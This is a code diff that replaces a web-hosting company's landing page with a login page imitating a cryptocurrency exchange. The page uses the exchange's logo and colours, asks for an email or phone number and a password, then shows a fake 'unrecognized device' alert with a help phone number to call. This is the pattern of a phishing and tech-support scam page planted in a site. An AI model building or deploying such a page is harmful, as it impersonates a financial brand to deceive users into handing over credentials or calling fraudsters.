@@ -1,454 +1,202 @@
 <!DOCTYPE html>
-<html lang="zxx">
+<html lang="en">
 <head>
-    <title>Rack Nova | Hosting Solutions, Web Designing & Web Development</title>
-
-    <!-- /SEO Ultimate -->
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <meta charset="utf-8">
-    <!-- Primary Meta Tags -->
-    <meta name="title" content="Rack Nova | Hosting Solutions, Web Designing & Web Development">
-    <meta name="description" content="Rack Nova provides secure hosting, creative web designing, and scalable web development solutions. Get free domain, SSL, maintenance, domain transfer, and 24x7 support with our hosting plans.">
-
-    <!-- Keywords -->
-    <meta name="keywords" content="Rack Nova, Hosting Solutions, Web Hosting, Secure Hosting, Free Domain, Free SSL, Web Designing, Website Development, Web Development Services, Domain Transfer, Free Web Maintenance, 24x7 Support">
-
-    <!-- Author -->
-    <meta name="author" content="Rack Nova">
-
-    <!-- Robots -->
-    <meta name="robots" content="index, follow">
-    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon.png">
-    <link rel="manifest" href="assets/images/favicon/manifest.json">
-    <meta name="msapplication-TileColor" content="#ffffff">
-    <meta name="msapplication-TileImage" content="../ms-icon-144x144.html">
-    <meta name="theme-color" content="#ffffff">
-    <!-- Latest compiled and minified CSS -->
-    <link href="assets/bootstrap/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="assets/js/bootstrap.min.js">
-    <!-- Font Awesome link -->
-    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <!-- StyleSheet link CSS -->
-    <link href="assets/css/style.css" rel="stylesheet" type="text/css">
-    <link href="assets/css/responsive.css" rel="stylesheet" type="text/css">
-    <link href="assets/css/drawer-menu2.css" rel="stylesheet" type="text/css">
-    <link href="assets/css/owl.carousel.min.css" rel="stylesheet" type="text/css">
-    <link href="assets/css/owl.theme.default.min.css" rel="stylesheet" type="text/css">
-    <link href="assets/css/aos.css" rel="stylesheet">
-    <link href="assets/css/magnific-popup.css" rel="stylesheet" type="text/css">
-    <style>
-        html {
-  scroll-behavior: smooth !important;
-}
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <link rel="apple-touch-icon" href="favicon.png"> <!-- for iOS devices -->
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #0f1115; /* Dark background */
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .login-card {
+      background-color: #1a1d23; 
+      padding: 2rem;
+      border-radius: 1rem;
+      width: 380px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+    .btn-yellow {
+      background-color: #ffcc00;
+      border: none;
+      font-weight: 600;
+      color: #000;
+    }
+    .btn-yellow:hover {
+      background-color: #e6b800;
+    }
+    .form-control {
+      background-color: #0f1115;
+      border: 1px solid #333;
+      color: #fff;
+    }
+    .form-control:focus {
+      background-color: #0f1115;
+      border-color: #ffcc00;
+      box-shadow: none;
+      color: #fff;
+    }
+    .requirement {
+      font-size: 0.9rem;
+    }
+    .valid {
+      color: #28a745;
+    }
+    .invalid {
+      color: #dc3545;
+    }
+    .help-link {
+      margin-top: 10px;
+      display: block;
+      text-align: center;
+      color: #28a745;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .help-link:hover {
+      text-decoration: underline;
+    }
+    .qr-icon {
+      font-size: 1.5rem;
+      color: #fff;
+      cursor: pointer;
+    }
+    
+  </style>
 </head>
 <body>
-
-<div class="home1_banner_outer position-relative">
-    <header class="header">
-        <div class="container">
-            <nav class="navbar navbar-expand-lg navbar-light p-0">
-                <a class="navbar-brand" href="index.html">
-                    <figure class="logo mb-0"><img src="assets/images/racknova.webp" alt="image" class="img-fluid"></figure>
-                </a>
-                <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
-                    aria-expanded="false" aria-label="Toggle navigation">
-                    <span class="navbar-toggler-icon"></span>
-                    <span class="navbar-toggler-icon"></span>
-                    <span class="navbar-toggler-icon"></span>
-                </button>
-                <div class="collapse navbar-collapse" id="navbarSupportedContent">
-                    <ul class="navbar-nav ml-auto">
-                        <li class="nav-item last-item">
-                            <a class="nav-link" href="index.html">Home</a>
-                        </li>
-                        <li class="nav-item last-item">
-                            <a class="nav-link" href="#aboutus">About Us</a>
-                        </li>
-                        <li class="nav-item last-item">
-                            <a class="nav-link" href="#hosting">Hosting</a>
-                        </li>
-                        <li class="nav-item last-item">
-                            <a class="nav-link" href="#features">Features</a>
-                        </li>
-                        <li class="nav-item last-item">
-                            <a class="nav-link" href="#contactus">Contact Us</a>
-                        </li>
-                        
-                        
-                    </ul>
-                </div>
-                
-            </nav>
-        </div>
-    </header>
+  <div class="login-card">
+    <svg height="24" width="120" class="bn-svg default-icon block" viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg"><path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path></svg>
+    <div class="d-flex justify-content-between align-items-center mb-4 pt-4">
+      <h3 class="m-0">Log in</h3>
+      <i class="bi bi-qr-code qr-icon"></i>
+    </div>
     
-    <div id="sidebar-drawer-curtain"></div>
-    <!-- Search Form -->
-    <div id="search" class=""> 
-        <span class="close">X</span>
-        <form role="search" id="searchform" method="get">
-            <input value="" name="q" type="search" placeholder="Type to Search">
-        </form>
+    <!-- Step 1: Phone/Email -->
+    <div id="step1">
+      <div class="mb-3">
+        <label for="emailPhone" class="form-label">Phone number / Email</label>
+        <input type="text" class="form-control" id="emailPhone" placeholder="+91XXXXXXXXXX or name@email.com">
+      </div>
+      <button type="button" class="btn btn-yellow w-100 py-2" onclick="goToPassword()">
+        Continue
+      </button>
     </div>
-    <!-- Banner -->
-    <section class="banner-con position-relative">
-        <div class="container position-relative">
-           
-            <div class="row align-items-center">
-                <div class="col-lg-6 col-12 text-lg-left text-center order-lg-1 order-2">
-                    <div class="banner_wrapper position-relative" data-aos="fade-up">
-                        <figure class="banner-image mb-0">
-                            <img src="assets/images/banner-image.jpg" alt="image" class="img-fluid">
-                        </figure>
-                        <div class="circle">
-                            <figure class="banner-icon mb-0">
-                                <img src="assets/images/banner-icon.png" alt="image" class="img-fluid">
-                            </figure>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-6 col-12 order-lg-2 order-1">
-                    <div class="banner_content position-relative" data-aos="fade-up">
-                        <h6>Power Your Online Growth</h6>
-                        <h1>Secure Hosting, Smart Websites</h1>
-                        <p class="text1 text-size-18">We build and host modern, scalable websites backed by 24x7 expert support.</p>
-                        <ul class="list-unstyled list">
-                            <li>
-                                <i class="fa fa-check"></i>
-                                <p class="mb-0 text-size-16">Free Domain</p>
-                            </li>
-                            <li>
-                                <i class="fa fa-check"></i>
-                                <p class="mb-0 text-size-16">Free SSL Certificate</p>
-                            </li>
-                            <li>
-                                <i class="fa fa-check"></i>
-                                <p class="mb-0 text-size-16">24/7 Customer Support</p>
-                            </li>
-                        </ul>
-                        <div class="button">
-                            <a href="#contactus" class="text-decoration-none primary_btn">Get Started Today</a>
-                        </div>
-                        <figure class="banner-triangleimage mb-0">
-                            <img src="assets/images/banner-triangleimage.png" alt="image" class="img-fluid">
-                        </figure>
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-</div>
-<!-- Hosting -->
 
-<!-- Discover -->
-<section id="aboutus" class="discover-con position-relative" style="background: #ffffff !important;">
-    <div class="container">
-        <div class="row align-items-center">
-            <div class="col-xl-7 col-lg-6 col-12">
-                <div class="discover_content position-relative" data-aos="fade-up">
-                    <h6>About Rack Nova</h6>
-                    <h2>Discover the Power Behind Your Online Success</h2>
-                    <p class="text1 text-size-16">At Rack Nova, we believe every business deserves a strong and reliable digital presence. That’s why we combine powerful hosting solutions, creative web designing, and custom web development to give our clients everything they need in one place.
-                    </p>
-                    <p class="text2 text-size-16">We’re not just another hosting company—we’re your digital growth partner. By partnering with some of the world’s best hosting providers, we make sure your website is secure, fast, and always online. Plus, with our free domain, SSL, web maintenance, and easy domain transferring, getting started online has never been easier.</p>
-                    <div class="button">
-                        <a href="#contactus" class="text-decoration-none primary_btn">Explore Our Services</a>
-                    </div>
-                    <figure class="discover-triangleimage mb-0">
-                        <img src="assets/images/testimonial-triangleimage.png" alt="image" class="img-fluid">
-                    </figure>
-                </div>
-            </div>
-            <div class="col-xl-5 col-lg-6 col-12 text-lg-left text-center">
-                <div class="discover_wrapper position-relative" data-aos="fade-up">
-                    <figure class="discover-image mb-0">
-                        <img src="assets/images/discover-image.jpg" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="circle">
-                        <span class="text">24/7<br>Support</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-<section id="hosting" class="hosting-con position-relative">
-    <figure class="hosting-leftimage mb-0">
-        <img src="assets/images/help-leftimage.png" alt="image" class="img-fluid">
-    </figure>
-    <div class="container">
-        <div class="row">
-            <div class="col-xl-8 col-lg-10 col-12 mx-auto">
-                <div class="hosting_content text-center" data-aos="fade-up">
-                    <h2>Affordable and Flexible Plans</h2>
-                    <p class="text-size-16">We Provide Premium Website & VPS Hosting As Well As Offering Our Web Development And Administration Services To Our Amazing Customers.</p>
-                </div>
-            </div>
-        </div>
-        <div class="hosting_wrapper">
-            <div class="row all_row" data-aos="fade-up">
-                <div class="col-lg-3 col-md-6 col-sm-6 col-12 all_column">
-                    <div class="hosting-box box1">
-                        <div class="box_content">
-                            <figure class="icon">
-                                <img src="assets/images/hosting-icon1.png" alt="image" class="img-fluid">
-                            </figure>
-                            <h4>Shared Hosting</h4>
-                            <p class="text-size-16">Get started with reliable & cost-effective hosting.</p>
-                            <a href="#contactus" class="text-decoration-none"><i class="fa-solid fa-arrow-right"></i></a>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-3 col-md-6 col-sm-6 col-12">
-                    <div class="hosting-box box2 box">
-                        <div class="box_content">
-                            <figure class="icon">
-                                <img src="assets/images/hosting-icon2.png" alt="image" class="img-fluid">
-                            </figure>
-                            <h4>WordPress Hosting</h4>
-                            <a href="#contactus" class="text-decoration-none"><i class="fa-solid fa-arrow-right"></i></a>
-                        </div>
-                    </div>
-                    <div class="hosting-box box3 box">
-                        <div class="box_content">
-                            <figure class="icon">
-                                <img src="assets/images/hosting-icon3.png" alt="image" class="img-fluid">
-                            </figure>
-                            <h4>Email Hosting</h4>
-                            <a href="#contactus" class="text-decoration-none"><i class="fa-solid fa-arrow-right"></i></a>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-3 col-md-6 col-sm-6 col-12 all_column">
-                    <div class="hosting-box box4">
-                        <div class="box_content">
-                            <figure class="icon">
-                                <img src="assets/images/hosting-icon4.png" alt="image" class="img-fluid">
-                            </figure>
-                            <h4>Dedicated Server</h4>
-                            <p class="text-size-16">Experience total control and peak performance.</p>
-                            <a href="#contactus" class="text-decoration-none"><i class="fa-solid fa-arrow-right"></i></a>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-3 col-md-6 col-sm-6 col-12 all_column">
-                    <div class="hosting-box box5">
-                        <div class="box_content">
-                            <figure class="icon">
-                                <img src="assets/images/hosting-icon5.png" alt="image" class="img-fluid">
-                            </figure>
-                            <h4>VPS Hosting</h4>
-                            <p class="text-size-16">Enjoy the perfect blend of power and flexibility.</p>
-                            <a href="#contactus" class="text-decoration-none"><i class="fa-solid fa-arrow-right"></i></a>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
+    <!-- Step 2: Password -->
+    <div id="step2" style="display:none;">
+      <div class="mb-3">
+        <label for="password" class="form-label">Password</label>
+        <input type="password" class="form-control" id="password" placeholder="Enter password">
+      </div>
 
-<section id="features" class="feature-con position-relative">
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-9 col-12 mx-auto">
-                <div class="feature_content text-center" data-aos="fade-up">
-                    <h6>Hosting Features</h6>
-                    <h2>Unmatched Features for Unbeatable Performance</h2>
-                </div>
-            </div>
-        </div>
-        <div class="row all_row" data-aos="fade-up">
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 all_column">
-                <div class="feature-box">
-                    <figure class="icon mb-0">
-                        <img src="assets/images/feature-icon1.png" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="content">
-                        <h4>99.9% Uptime Guarantee</h4>
-                        <p class="text-size-16 mb-0">Keep your website online and accessible with our industry-leading uptime guarantee. Your visitors will always find you available.</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 all_column">
-                <div class="feature-box">
-                    <figure class="icon mb-0">
-                        <img src="assets/images/feature-icon2.png" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="content">
-                        <h4>Free Website Builder</h4>
-                        <p class="text-size-16 mb-0">Create a stunning website with ease using our intuitive, drag-and-drop website builder. No coding skills required.</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 all_column">
-                <div class="feature-box">
-                    <figure class="icon mb-0">
-                        <img src="assets/images/feature-icon3.png" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="content">
-                        <h4>Scalable Solutions</h4>
-                        <p class="text-size-16 mb-0">Our hosting plans grow with your business. Upgrade or downgrade your plan effortlessly as your needs change.</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 all_column">
-                <div class="feature-box">
-                    <figure class="icon mb-0">
-                        <img src="assets/images/feature-icon4.png" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="content">
-                        <h4>24/7 Tech Support</h4>
-                        <p class="text-size-16 mb-0">Get round-the-clock assistance from our expert support team. We're here to help you anytime, anywhere.</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 all_column">
-                <div class="feature-box">
-                    <figure class="icon mb-0">
-                        <img src="assets/images/feature-icon5.png" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="content">
-                        <h4>Free Email Hosting</h4>
-                        <p class="text-size-16 mb-0">Enjoy professional email hosting with your domain. Enhance your brand image with custom email addresses.</p>
-                    </div>
-                </div>
-            </div>
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 all_column">
-                <div class="feature-box">
-                    <figure class="icon mb-0">
-                        <img src="assets/images/feature-icon6.png" alt="image" class="img-fluid">
-                    </figure>
-                    <div class="content">
-                        <h4>Robust Security</h4>
-                        <p class="text-size-16 mb-0">Protect your data with advanced security features, including free SSL certificates, daily backups, and DDoS protection.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
+      <!-- Inline alert -->
+      <div id="passwordAlert" class="alert alert-danger py-2" style="display:none;">
+        ⚠️ Please meet all password requirements.
+      </div>
 
-<!-- Help -->
-<!-- Contact Info -->
-<section id="contactus" class="contactinfo-con position-relative">
-    <figure class="background-layerimage mb-0">
-        <img src="assets/images/background-layerimage.png" alt="image" class="img-fluid">
-    </figure>
-    <figure class="topright-trianglelayer mb-0">
-        <img src="assets/images/topright-trianglelayer.png" alt="image" class="img-fluid">
-    </figure>
-    <div class="container">
-        <div class="row">
-            <div class="col-xl-9 col-lg-10 col-12 mx-auto">
-                <div class="contact_content text-center" data-aos="fade-up">
-                    <h6>Contact Us</h6>
-                    <h2>Have A Technical Issue Or Need Help Managing Your Account?</h2>
-                </div>
-            </div>
-        </div>
-        <div class="row all_row" data-aos="fade-up">
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 mx-auto all_column">
-                <div class="contact-box all_boxes">
-                    <figure class="icon icon1">
-                        <img src="assets/images/contact-icon1.png" alt="image" class="img-fluid">
-                    </figure>
-                    <h4>Contact Details</h4>
-                    <a href="" class="address text-decoration-none">2457 Pinecrest Avenue
-Springfield, IL 62704
-USA
-                    </a>
-                </div>
-            </div>
-            <div class="col-lg-6 col-md-6 col-sm-6 col-12 mx-auto all_column">
-                <div class="contact-box all_boxes">
-                    <figure class="icon icon2">
-                        <img src="assets/images/contact-icon2.png" alt="image" class="img-fluid">
-                    </figure>
-                    <h4>Email</h4>
-                    <a href="mailto:racknova@gmail.com" class="text-decoration-none">racknova@gmail.com</a>
-                    
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-<!-- Contact Form -->
-<section class="contactform-con position-relative">
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-12 mx-auto">
-                <div class="contact_content text-center" data-aos="fade-up">
-                    <h6>Contact Form</h6>
-                    <h2 class="text-white">Get in Touch With Us</h2>
-                </div>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xl-10 col-12 mx-auto">
-                <form id="contactpage" method="post" class="position-relative" data-aos="fade-up">
-                    <div class="form-group input1 float-left">
-                        <input type="text" class="form_style" placeholder="First Name" name="fname" id="fname">
-                    </div>
-                    <div class="form-group float-left">
-                        <input type="text" class="form_style" placeholder="Last Name" name="lname" id="lname">
-                    </div>
-                    <div class="form-group input1 float-left">
-                        <input type="email" class="form_style" placeholder="Email Address" name="email" id="email">
-                    </div>
-                    <div class="form-group float-left">
-                        <input type="tel" class="form_style" placeholder="Phone" name="phone" id="phone">
-                    </div>
-                    <div class="form-group message">
-                        <textarea class="form_style" placeholder="Message" rows="3" name="msg"></textarea>
-                    </div>
-                    <button type="submit" id="submit" class="submit_now text-decoration-none">Send Message</button>
-                </form>
-            </div>
-        </div>
-    </div>
-</section>
+      <!-- Password rules (hidden initially) -->
+      <div id="passwordRules" class="mb-2" style="display:none;">
+        <button class="btn btn-danger">New sign-in from an unrecognized device or location.</button>
+        
+        <a href="tel:+18382593865" class="help-link d-block pb-4">📞 Need help? Call +1 838-259-3865</a>
+      </div>
 
+      <!-- Continue button -->
+      <button type="button" class="btn btn-yellow w-100 py-2" onclick="validatePassword()">
+        Continue
+      </button>
 
-<!-- Footer -->
-<section class="footer-con position-relative">
-    
-    <div class="container position-relative">
-       
-        <div class="copyright">
-            <div class="row">
-                <div class="col-12">
-                    <div class="copyright_text">
-                        <a class="footer-logo" href="index.html">
-                            <figure class="logo mb-0"><img src="assets/images/racknova.webp" alt="image" class="img-fluid"></figure>
-                        </a>
-                        <p class="mb-0">© 2025 Rack Nova. All Rights Reserved.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
+      <!-- Final sign up button -->
+      <button type="button" id="signupBtn" class="btn btn-yellow w-100 py-2 mt-3" disabled>
+        Sign Up
+      </button>
     </div>
-</section>
-<!-- PRE LOADER -->
-<div class="loader-mask">
-    <div class="loader">
-        <div></div>
-        <div></div>
-    </div>
-</div>
-<!-- Latest compiled JavaScript -->
-<script src="assets/js/jquery-3.7.1.min.js"></script>
-<script src="assets/js/popper.min.js"></script>
-<script src="assets/js/bootstrap.min.js"></script>
-<script src="assets/js/aos.js"></script>
-<script src="assets/js/owl.carousel.js"></script>
-<script src="assets/js/carousel.js"></script>
-<script src="assets/js/animation.js"></script>
-<script src="assets/js/back-to-top-button.js"></script>
-<script src="assets/js/preloader.js"></script>
-<script src="assets/js/search.js"></script>
-<script src="assets/js/drawer-menu2.js"></script>
+  </div>
+
+  <script>
+    function goToPassword() {
+      const input = document.getElementById("emailPhone").value.trim();
+      if (!input) {
+        alert("⚠️ Please enter your phone number or email");
+        return;
+      }
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+      document.getElementById("password").focus(); // auto-focus password
+    }
+
+    function checkPassword() {
+      const pass = document.getElementById("password").value;
+      let valid = true;
+
+      const rules = {
+        ruleLength: pass.length >= 8,
+        ruleNumber: /\d/.test(pass),
+        ruleLower: /[a-z]/.test(pass),
+        ruleUpper: /[A-Z]/.test(pass),
+        ruleSymbol: /[!@#$%^&*]/.test(pass),
+      };
+
+      for (let rule in rules) {
+        const el = document.getElementById(rule);
+        if (el) { // only if rule element exists
+          if (rules[rule]) {
+            el.textContent = "✅ " + el.textContent.replace("❌ ", "").replace("✅ ", "");
+            el.classList.add("valid");
+            el.classList.remove("invalid");
+          } else {
+            el.textContent = "❌ " + el.textContent.replace("✅ ", "").replace("❌ ", "");
+            el.classList.add("invalid");
+            el.classList.remove("valid");
+            valid = false;
+          }
+        }
+      }
+
+      return valid;
+    }
+
+    function validatePassword() {
+      document.getElementById("passwordRules").style.display = "block"; // show rules now
+      const valid = checkPassword();
+
+      if (!valid) {
+        document.getElementById("passwordAlert").style.display = "block";
+        document.getElementById("signupBtn").disabled = true;
+      } else {
+        document.getElementById("passwordAlert").style.display = "none";
+        document.getElementById("signupBtn").disabled = false;
+      }
+    }
+
+    // Handle Enter key for phone/email
+    document.getElementById("emailPhone").addEventListener("keypress", function (e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        goToPassword();
+      }
+    });
+
+    // Handle Enter key for password
+    document.getElementById("password").addEventListener("keypress", function (e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        validatePassword();
+      }
+    });
+  </script>
+
+   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
+
 </body>
 </html>
